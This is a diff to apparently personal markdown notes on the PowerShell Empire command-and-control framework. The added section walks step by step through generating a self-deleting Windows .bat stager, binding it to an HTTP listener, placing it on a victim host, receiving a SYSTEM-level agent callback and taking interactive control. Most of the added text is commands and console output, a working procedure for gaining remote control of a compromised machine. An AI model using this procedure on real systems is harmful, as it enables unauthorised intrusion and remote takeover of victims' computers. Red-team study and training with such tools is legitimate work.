@@ -18,7 +18,7 @@ Via client attacker uses server to attack victims. Connect to server address sho
 
 ```bash
 
-powershell-empire client
+sudo powershell-empire client
 
 #in the psempire shell connect to local host or other ip
 
@@ -90,3 +90,44 @@ Now somehow we need to connect to a victim. There are two ways of doing it:
 2. reverse: victim connects to us
 
 Both of those ways need a stager that must be transferred to victim and activated preferrably with root or SYSTEM privileges.
+
+```bash
+#generate windows stager
+
+(Empire: listeners) > usestager windows/launcher_bat
+
+ Author       @harmj0y                                                            
+ Description  Generates a self-deleting .bat launcher for Empire. Only works with 
+              the HTTP and HTTP COM listeners.                                    
+ Name         windows/launcher_bat  
+
+#assign listener to stager
+
+(Empire: usestager/windows/launcher_bat) > set Listener http
+[*] Set Listener to http
+
+# generate stager file 
+
+(Empire: usestager/windows/launcher_bat) > execute
+[+] stage1.bat written to /var/lib/powershell-empire/empire/client/generated-stagers/stage1.bat
+
+#upload this stage file to victim host and launch it
+#on success you see
+
+[*] Sending agent (stage 2) to TV6GENUD at 192.168.158.10
+
+# check if its really there 
+
+(Empire: usestager/windows/launcher_bat) > agents
+
+┌Agents──────────┬────────────┬───────────────┬─────────────┬
+│ 1  │ TV6GENUD* │ powershell │ 172.16.158.10 │ corp\SYSTEM │ powershell │ 3708 │ 5/0.0 │ 2023-03-06 20:40:24 CET │ http     │
+
+# looks good
+# start using the connected agent
+
+(Empire: agents) > interact TV6GENUD
+(Empire: TV6GENUD) >
+
+
+```
